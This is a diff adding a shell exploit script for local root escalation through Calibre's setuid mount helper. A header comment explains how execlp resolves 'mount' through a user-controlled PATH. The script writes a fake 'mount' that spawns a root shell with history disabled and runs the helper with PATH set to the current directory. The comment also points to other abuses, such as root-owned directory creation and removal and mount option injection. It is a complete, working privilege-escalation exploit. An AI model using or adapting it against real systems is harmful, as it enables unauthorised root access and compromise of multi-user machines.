@@ -1,0 +1,103 @@
+#!/bin/sh
+
+                  #######################################
+                  #     .50-Calibrer Assault Mount      #
+                  #              by zx2c4               #
+                  #######################################
+
+################################################################################
+# Calibre uses a suid mount helper, and like nearly all suid mount helpers that
+# have come before it, it's badly broken. Let's go through Calibre's faulty code
+# available at http://pastebin.com/auz9SULi and look at the array of silly
+# things done, only one of which we actually need to get root.
+#
+# In this spot here, we can create a directory owned by root anywhere we want:
+#
+# 47	    if (!exists(mp)) {
+# 48	        if (mkdir(mp, S_IRUSR|S_IWUSR|S_IXUSR|S_IRGRP|S_IXGRP|S_IROTH|S_IXOTH) != 0) {
+# 49	            errsv = errno;
+# 50	            fprintf(stderr, "Failed to create mount point with error: %s\n", strerror(errsv));
+# 51	        }
+# 52	    }
+#
+# At this point, we can remove any empty directory we want:
+#
+# 172	    rmd = rmdir(mp);
+#
+# And elsewhere, we can create and remove anything_we_want/.some_stupid_marker.
+# I'm sure you can figure out how to exploit these kinds of things :-P.
+#
+# We also get the ability with this wonderful mount-helper to unmount and eject
+# any device that we want (as root), as well as mount any vfat filesystem that
+# we'd like.
+#
+# Not only that, but we can pass params directly to mount, to some degree:
+#  
+# 83	    execlp("mount", "mount", "-t", "auto", "-o", options, dev, mp, NULL);
+#
+# On this line, "dev" and "mp" are controlled by argv[2] and argv[3]. I'm sure
+# you can find fun things to do with this as well. (There -s and also the man
+# pages say the last -o is respected, etc etc. Be creative.)
+#
+# But there's also something lurking that is way worse in this line. Is that
+# "execlp" we see? Yes.  According to the man pages:
+#
+#     The execlp(), execvp(), and execvpe() functions duplicate the  actions  of
+#     the  shell  in searching  for  an  executable file if the specified
+#     filename does not contain a slash (/) character.
+#
+# execlp searchs PATH for where to find "mount", and then runs it as root. And,
+# with great joy, we find that we can trivially control PATH by setting it
+# before running the mount helper. So the attack plan is simple:
+#
+#    1. Make an executable named "mount" in the current directory that executes
+#       a shell.
+#    2. PATH=".:$PATH" calibre-mount-helper mount something somethingelse
+#
+# And that's it! We have root. The below exploit creates things in a temporary
+# directory that gets cleaned up and displays some status information along the
+# way.
+#
+# - zx2c4
+# 2011-11-1
+#
+# Usage:
+# $ ./50calibrerassaultmount.sh
+# [+] Making temporary directory: /tmp/tmp.q5ktd8UcxP
+# [+] Making mount point.
+# [+] Writing malicious mounter.
+# [+] Overriding PATH and getting root.
+# [+] Cleaning up: /tmp/tmp.q5ktd8UcxP
+# [+] Checking root: uid=0(root) gid=0(root) groups=0(root)
+# [+] Launching shell.
+# sh-4.2# 
+#
+################################################################################
+
+
+set -e
+echo "#######################################"
+echo "#     .50-Calibrer Assault Mount      #"
+echo "#              by zx2c4               #"
+echo "#######################################"
+echo
+echo -n "[+] Making temporary directory: "
+dir="$(mktemp -d)"
+echo "$dir"
+cd "$dir"
+echo "[+] Making mount point."
+mkdir mountpoint
+echo "[+] Writing malicious mounter."
+cat > mount <<END
+#!/bin/sh
+cd /
+echo "[+] Cleaning up: $dir"
+rm -rf "$dir"
+echo -n "[+] Checking root: "
+id
+echo "[+] Launching shell."
+HISTFILE="/dev/null" exec /bin/sh
+END
+chmod +x mount
+echo "[+] Overriding PATH and getting root."
+PATH=".:$PATH" calibre-mount-helper mount /dev/null mountpoint
